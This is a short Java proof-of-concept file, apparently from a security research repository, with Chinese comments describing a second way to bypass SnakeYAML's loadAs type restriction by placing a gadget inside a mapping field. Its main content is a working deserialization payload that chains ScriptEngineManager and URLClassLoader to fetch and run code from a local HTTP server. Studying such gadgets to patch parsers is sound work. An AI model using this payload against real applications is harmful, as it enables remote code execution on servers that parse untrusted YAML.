package com.rhein.bypass.case1;

import com.rhein.demo.User;
import org.yaml.snakeyaml.Yaml;

/**
 * 绕过 loadAs 函数对类型的限制
 *   第二种绕过方式：构造Mapping类型
 *   注意：key 值需要是指定类的 field，因为 payload 触发是在调用 setXx 函数之后，所以要保证 key 值是真实存在的。
 */
public class Bypass2 {

    public static void main(String[] args) {
        // 第二种绕过方式：构造 Mapping 类型
        String malicious2 = "{username: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader "
                + "[[!!java.net.URL [\"http://127.0.0.1:8000/\"]]]]}";
        Yaml yaml = new Yaml();
        yaml.loadAs(malicious2, User.class);
    }
}
